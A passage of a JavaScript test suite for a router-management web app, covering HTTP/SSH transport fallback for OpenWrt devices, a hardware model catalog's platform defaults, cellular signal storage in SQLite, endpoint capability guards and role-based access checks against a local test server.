  ok(explainExit({ error: 'connection refused' }) === 'connection refused', 'and a non-ubus error passes through');
}

// ---- transport selection -----------------------------------------------------------------------
{
  const { autoTransport } = await import('../lib/drivers/openwrt.js');

  // A device set to 'ssh' must never touch HTTP — that is the entire point of storing it.
  let httpCalls = 0, sshCalls = 0;
  const mk = {
    http: () => ({ kind: 'http', endpoint: 'http', async call() { httpCalls++; return { ok: false, error: 'not ubus', unreachable: true }; } }),
    ssh: () => ({ kind: 'ssh', endpoint: 'ssh', async call() { sshCalls++; return { ok: true, data: { model: 'KAT-K500A' } }; },
                  async run() { return { ok: true, data: '' }; } })
  };

  const auto = autoTransport(mk);
  await auto.call('system', 'board');
  ok(httpCalls === 1 && sshCalls === 1, 'auto tries HTTP, then falls back to SSH');
  ok(auto.kind === 'ssh', 'and settles on what worked');
  await auto.call('system', 'info');
  await auto.call('network.device', 'status');
  // The failure this prevents: a dozen 8-second timeouts inside one poll.
  ok(httpCalls === 1, 'it decides ONCE — later calls do not retry the dead endpoint');
  ok(sshCalls === 3, 'and go straight to the transport that answered');

  // A ubus error is not a transport failure. Retrying it over SSH would hide the real cause.
  let tried = 0;
  const denying = {
    http: () => ({ kind: 'http', endpoint: 'http', async call() { tried++; return { ok: false, code: 6, error: 'permission denied' }; } }),
    ssh: () => ({ kind: 'ssh', endpoint: 'ssh', async call() { tried += 100; return { ok: true, data: {} }; } })
  };
  const a2 = autoTransport(denying);
  const r = await a2.call('iwinfo', 'devices');
  ok(!r.ok && r.code === 6, 'a ubus-level denial is returned as-is');
  ok(tried === 1, 'and does NOT trigger a fallback, which would mask why it failed');

  // The stored preference short-circuits the whole dance.
  const sshOnly = createDriver({ mgmt_address: '10.241.80.78', admin_password: 'x', mgmt_transport: 'ssh' },
    { sshExec: async () => ({ ok: true, stdout: '{}' }) });
  ok(sshOnly.transport === 'ssh', 'a device stored as ssh builds the SSH transport directly');
  const httpPref = createDriver({ mgmt_address: '10.0.0.3', admin_password: 'x', mgmt_transport: 'http' }, {});
  ok(httpPref.transport === 'http', 'and one stored as http builds that one');
  ok(createDriver({ mgmt_address: '10.0.0.4', admin_password: 'x' }, {}).transport === 'auto',
    'an unprobed device is auto, so it still works without being set up first');
}

// ---- the API, against a live server ------------------------------------------------------------
{
  const B = process.env.BASE ?? 'http://localhost:3000';
  let cookie = '';
  async function call(p, { method = 'GET', body } = {}) {
    const h = {}; if (body !== undefined) { h['content-type'] = 'application/json'; if (method === 'GET') method = 'POST'; }
    if (cookie) h.cookie = cookie;
    const r = await fetch(B + p, { method, headers: h, body: body !== undefined ? JSON.stringify(body) : undefined });
    const sc = r.headers.get('set-cookie'); if (sc) cookie = sc.split(';')[0];
    const t = await r.text(); let j = null; try { j = JSON.parse(t); } catch {}
    return { status: r.status, json: j, t };
  }
  const login = async (email, password) => { cookie = ''; return call('/api/login', { body: { email, password } }); };

  await login('admin@geekitek.test', 'admin123');

  const meta = (await call('/api/meta')).json;
  ok(Array.isArray(meta.platforms) && meta.platforms.length >= 4, 'the form\'s platform list is served from the registry');
  ok(meta.platforms.find(p => p.key === 'openwrt').caps.includes('interfaces'),
    'with each platform\'s capabilities, so the page never hardcodes them');

  // Create one of each and check the column round-trips.
  const mk = async (platform) => (await call('/api/devices', {
    body: { name: `DRIVERTEST ${platform}`, platform, mgmt_address: '127.0.0.1', admin_username: 'root', admin_password: 'x' }
  })).json.id;
  const ow = await mk('openwrt'), un = await mk('unknown'), ros = await mk('routeros');

  const owd = (await call('/api/devices/' + ow)).json;
  ok(owd.platform === 'openwrt', 'the platform round-trips through create');
  ok(owd.caps && owd.caps.interfaces === true && owd.caps.firmware === false,
    'and the device read carries the capability map the page gates on');
  ok(owd.platform_label === 'OpenWrt (and vendor builds of it)', 'with a label fit to display');

  // The migration's promise: nothing existing changed.
  const all = (await call('/api/devices')).json;
  ok(all.every(d => d.platform), 'every device has a platform after the migration');
  ok((await call('/api/devices/' + ros)).json.platform === 'routeros', 'and RouterOS remains the default');

  // A device nobody manages must refuse clearly rather than time out for 8 seconds first.
  const t0 = Date.now();
  const r = await call('/api/devices/' + un + '/poll', { body: {} });
  ok(r.status === 400, 'polling an unmanaged device is a 400');
  ok(/not managed from here/i.test(r.json.error), 'and says why, naming the setting to change');
  ok(Date.now() - t0 < 2000, 'refused immediately rather than after a network timeout');

  // Editing must not silently drop the platform — PUT lists its columns explicitly, and a field
  // missing from that list is silently un-saveable.
  const cur = (await call('/api/devices/' + ow)).json;
  await call('/api/devices/' + ow, { method: 'PUT', body: { ...cur, platform: 'ddwrt' } });
  ok((await call('/api/devices/' + ow)).json.platform === 'ddwrt', 'the platform survives an edit');

  // Probing reaches devices on the management overlay and reports what is listening. That is not
  // something a support login should be able to aim at anything.
  await login('support@geekitek.test', 'support123');
  ok((await call('/api/devices/' + ow + '/probe', { body: {} })).status === 403, 'probing is NOC-only');

  await login('admin@geekitek.test', 'admin123');
  const noAddr = (await call('/api/devices', { body: { name: 'DRIVERTEST noaddr' } })).json.id;
  const pr = await call('/api/devices/' + noAddr + '/probe', { body: {} });
  ok(pr.status === 400, 'a device with no management address cannot be probed');

  // ---- the model catalog knows the platform --------------------------------------------------
  //
  // The Operating system field existed and was still useless in practice: there was no catalog
  // entry for the hardware, and nothing connected a chosen model to the field. Someone adding a
  // Katalyst had to know to set it by hand, and a device left alone got polled as a MikroTik.
  const models = (await call('/api/models')).json;
  const byName = (mfr, frag) => models.find(m => m.manufacturer === mfr && m.model.includes(frag));

  const spark = byName('Katalyst', 'Spark');
  ok(!!spark, 'the Katalyst Spark is in the model catalog — it can be picked when adding one');
  ok(spark.default_platform === 'openwrt', 'and the catalog knows it is OpenWrt');
  ok(spark.has_cellular === 1, 'and that it is cellular, which is what puts the signal card on its page');

  // The OEM name too: the Spark is a rebadged GL.iNet XE3000, and a technician searches for
  // whichever name is printed on the box in front of them.
  ok(byName('GL.iNet', 'XE3000'), 'the underlying GL.iNet hardware is listed under its own name as well');
  ok(byName('GL.iNet', 'Flint').default_platform === 'openwrt', 'GL.iNet hardware ships OpenWrt, so the catalog says so');

  // Hardware that could be running anything must NOT claim a platform. A wrong default assigns a
  // driver that fails every poll for a reason nobody can see.
  const wrt = byName('Linksys', 'WRT1900ACS');
  ok(!!wrt, 'the Linksys WRT series is in the catalog');
  ok(!wrt.default_platform,
    'but carries no platform — the same chassis runs stock, OpenWrt or DD-WRT depending on what was flashed');
  ok(!byName('Netgear', 'R7800').default_platform, 'same for flashable Netgear hardware');

  ok(byName('MikroTik', 'hEX S').default_platform === 'routeros', 'MikroTik models are RouterOS');
  ok(byName('Ubiquiti', 'UDM-Pro').default_platform === 'unknown',
    'and UniFi is marked unmanaged, since controller polling is not built — better than offering cards that cannot work');

  // Every hint must name a platform that exists, or the form would select a value the driver layer
  // does not recognise and silently fall back to RouterOS.
  const hints = [...new Set(models.map(m => m.default_platform).filter(Boolean))];
  ok(hints.every(h => PLATFORMS[h]), `every catalog platform hint is a real platform (${hints.join(', ')})`);

  // Creating a device with the catalog's hint must round-trip.
  const kat = (await call('/api/devices', {
    body: { name: 'DRIVERTEST katalyst', model_id: spark.id, platform: spark.default_platform, mgmt_address: '127.0.0.1', admin_password: 'x' }
  })).json.id;
  const katRead = (await call('/api/devices/' + kat)).json;
  ok(katRead.platform === 'openwrt' && katRead.caps.interfaces, 'a device created from the catalog entry is set up to poll as OpenWrt');

  // ---- cellular signal STORAGE, not just parsing ------------------------------------------------
  //
  // The parsers were well covered and the code that writes their output to the database was not,
  // because no test ever polled a device with a modem. It shipped using `db.transaction(fn)` —
  // better-sqlite3's API, which node:sqlite does not have — and threw "db.transaction is not a
  // function" on the first real Katalyst poll. The interfaces had already been written, so the page
  // filled in and then showed an error, which is a confusing way to find out.
  //
  // So the write path is exercised here against a real database, using the same statements.
  {
    const { DatabaseSync } = await import('node:sqlite');
    const mem = new DatabaseSync(':memory:');
    mem.exec(`CREATE TABLE cell_signal (device_id INTEGER NOT NULL, ts TEXT NOT NULL,
      rsrp REAL, rsrq REAL, sinr REAL, rssi REAL, bars INTEGER, network_type TEXT, slot INTEGER,
      PRIMARY KEY (device_id, ts))`);

    const ins = mem.prepare(`INSERT INTO cell_signal (device_id, ts, rsrp, rsrq, sinr, rssi, bars, network_type, slot)
      VALUES (?,?,?,?,?,?,?,?,?) ON CONFLICT(device_id, ts) DO NOTHING`);
    const { parseModemSignal } = await import('../lib/drivers/openwrt.js');
    // Read the fixture here rather than reusing the earlier block's `cap`, which is scoped to it.
    const fixtureSig = parseModemSignal(
      JSON.parse(readFileSync('test/fixtures/katalyst-k500a.json', 'utf8')).modem_signal
    );

    const store = (samples) => {
      let n = 0;
      mem.exec('BEGIN');
      try {
        for (const s of samples) n += ins.run(1, s.ts, s.rsrp, s.rsrq, s.sinr, s.rssi, s.bars, s.networkType, s.slot).changes;
        mem.exec('COMMIT');
      } catch (e) { mem.exec('ROLLBACK'); throw e; }
      return n;
    };

    const first = store(fixtureSig.samples);
    ok(first === fixtureSig.samples.length, `all ${first} samples from a real device store`);

    // THE POINT OF THE PRIMARY KEY. Polls overlap heavily — the modem holds half an hour and the
    // platform polls every minute — so the same samples arrive again and again. Without the
    // conflict clause one device would accumulate thirty duplicate rows per minute.
    const second = store(fixtureSig.samples);
    ok(second === 0, 're-storing the same half hour inserts nothing, so overlapping polls do not duplicate');
    const total = mem.prepare('SELECT COUNT(*) n FROM cell_signal').get().n;
    ok(total === fixtureSig.samples.length, 'and the row count is unchanged');

    // A newer sample alongside old ones inserts only the new one.
    const newer = [{ ts: new Date(Date.now() + 60000).toISOString(), rsrp: -99, rsrq: -12, sinr: 14, rssi: -70, bars: 3, networkType: 'NR5G-NSA', slot: 1 }];
    ok(store([...fixtureSig.samples, ...newer]) === 1, 'a later poll stores only what is genuinely new');

    // Partial samples must not break the insert — a build reporting only RSSI still stores.
    ok(store([{ ts: '2026-01-01T00:00:00.000Z', rsrp: null, rsrq: null, sinr: null, rssi: -70, bars: null, networkType: null, slot: null }]) === 1,
      'a sample with null metrics stores rather than throwing');

    const back = mem.prepare('SELECT rsrp, network_type FROM cell_signal WHERE device_id=1 AND rsrp IS NOT NULL ORDER BY ts DESC LIMIT 1').get();
    ok(back.rsrp === -99 && back.network_type === 'NR5G-NSA', 'and the values read back as stored');
  }

  // The whole class of bug: better-sqlite3 idioms in a node:sqlite codebase. `db.transaction(fn)`
  // looks right, is widely documented, and does not exist here — it only fails when the line runs.
  {
    const files = ['server.js', 'db.js', 'domains/network.js', 'domains/importwiz.js', 'domains/billing.js',
                   'domains/fiber.js', 'domains/support.js', 'domains/mobile.js', 'domains/wireguard.js',
                   'domains/locate.js', 'domains/search.js', 'auth.js'];

    // Comments are stripped first. Both of these checks failed on their own first run — one matched
    // the comment explaining the rule, the other matched `express.raw()`, which is ordinary
    // middleware. A check that cries wolf gets switched off, so it has to look at code.
    const code = (f) => readFileSync(f, 'utf8')
      .replace(/\/\*[\s\S]*?\*\//g, ' ')       // block comments
      .replace(/(^|[^:])\/\/.*$/gm, '$1');     // line comments, without eating https://

    const offenders = files.filter(f => /\bdb\.transaction\s*\(/.test(code(f)));
    ok(offenders.length === 0,
      `no file calls db.transaction() — better-sqlite3's API, absent from node:sqlite${offenders.length ? ' (' + offenders.join(', ') + ')' : ''}`);

    // The other better-sqlite3 statement methods that do not exist here. `.raw(` is deliberately
    // NOT checked: express.raw() is legitimate and shares the name.
    const others = files.filter(f => /\.(pluck|iterate|safeIntegers)\s*\(/.test(code(f)));
    ok(others.length === 0, `nor .pluck()/.iterate()/.safeIntegers()${others.length ? ' (' + others.join(', ') + ')' : ''}`);
  }

  // ---- no endpoint may speak RouterOS to a non-RouterOS device -----------------------------------
  //
  // This exact bug was fixed three times, on three screens, each found by somebody clicking it:
  // polling, then the WiFi page, then the DHCP page. Every time the symptom was the same — an
  // OpenWrt router being told "Unexpected response (is REST enabled?)" about a REST API it has
  // never had — and every time the cause was an endpoint that predated the driver layer.
  //
  // Fixing them one at a time was the wrong response. This finds the rest.
  {
    // Hiding a card is not enough: the DHCP page was reached by URL with the card already hidden,
    // which is how it was found. So the ENDPOINTS are what get checked.
    const attempts = [
      ['GET', '/api/devices/' + kat + '/dhcp-leases', 'dhcpRead'],
      ['POST', '/api/devices/' + kat + '/dhcp-leases/action', 'dhcpWrite'],
      ['POST', '/api/devices/' + kat + '/wifi', 'wifiWrite'],
      ['POST', '/api/devices/' + kat + '/backup', 'configBackup'],
      ['GET', '/api/devices/' + kat + '/backup-debug', 'configBackup']
    ];
    for (const [method, path, capability] of attempts) {
      const r = await call(path, method === 'POST' ? { body: { id: 'x', action: 'remove', system: 'wifi' } } : {});
      const supported = can('openwrt', capability);
      if (supported) {
        // dhcpRead IS supported, so it must not be refused — it must be attempted through the
        // driver. It will fail to reach 127.0.0.1, and that is a device error, not a refusal.
        ok(r.status !== 400 || !(r.json && r.json.unsupported),
          `${path} is supported on OpenWrt and is attempted, not refused`);
      } else {
        ok(r.status === 400 && r.json && r.json.unsupported === true,
          `${method} ${path.replace(String(kat), ':id')} refuses cleanly on OpenWrt rather than trying REST`);
        ok(!/REST enabled/i.test(r.json.error),
          '  ...and does not blame the device for lacking a REST API it never had');
        ok(new RegExp(capability).test(r.json.capability), '  ...naming the capability that is missing');
        ok(/OpenWrt/.test(r.json.error), '  ...and the platform, so the message is actionable');
      }
    }

    // A RouterOS device must be entirely unaffected by the guard.
    const mt = (await call('/api/devices', { body: { name: 'CAPTEST mikrotik', platform: 'routeros', mgmt_address: '127.0.0.1', admin_password: 'x' } })).json.id;
    const mtr = await call('/api/devices/' + mt + '/dhcp-leases');
    ok(!(mtr.json && mtr.json.unsupported), 'a RouterOS device is never refused by the capability guard');
    await call('/api/devices/' + mt, { method: 'DELETE' });
  }

  // ---- the sampler diagnostic -------------------------------------------------------------------
  //
  // Added because an empty graph had several possible causes and the page named only one of them,
  // repeatedly, on a device where that one did not apply. The sampler caught every error and
  // discarded it, so there was no way to tell "never sampled" from "failing every minute".
  {
    const s = (await call('/api/devices/' + kat + '/sampler')).json;
    ok(s.last === null, 'a device that has never been sampled says so, rather than looking like a failure');
    ok(s.traffic_rows === 0 && s.latency_rows === 0, 'with the row counts that explain an empty graph');
    ok(Array.isArray(s.wan_tagged) && s.wan_tagged.length === 0,
      'and reports that no port is tagged WAN — which IS the cause when it is the cause');
    ok(s.platform === 'openwrt' && typeof s.transport === 'string',
      'plus the platform and transport, since those decide how it is sampled at all');
    ok(typeof s.enabled === 'boolean', 'and whether the sampler is even running on this server');

    await login('support@geekitek.test', 'support123');
    ok((await call('/api/devices/' + kat + '/sampler')).status === 403, 'the diagnostic is NOC-only');
    await login('admin@geekitek.test', 'admin123');
  }

  // ---- the signal endpoint ----------------------------------------------------------------------
  {
    const r = await call('/api/devices/' + kat + '/signal?range=24h');
    ok(r.status === 200, 'the signal endpoint answers for a device with no history yet');
    ok(r.json.total === 0 && Array.isArray(r.json.points), 'reporting nothing rather than erroring');
    ok(r.json.latest === null, 'with no latest reading');

    await login('support@geekitek.test', 'support123');
    ok((await call('/api/devices/' + kat + '/signal')).status === 403, 'and it is NOC-only');
    await login('admin@geekitek.test', 'admin123');
  }

  for (const id of [ow, un, ros, noAddr, kat]) await call('/api/devices/' + id, { method: 'DELETE' });
}

console.log(`RESULT: ${pass} passed, ${fail} failed`);
if (fail) process.exitCode = 1;
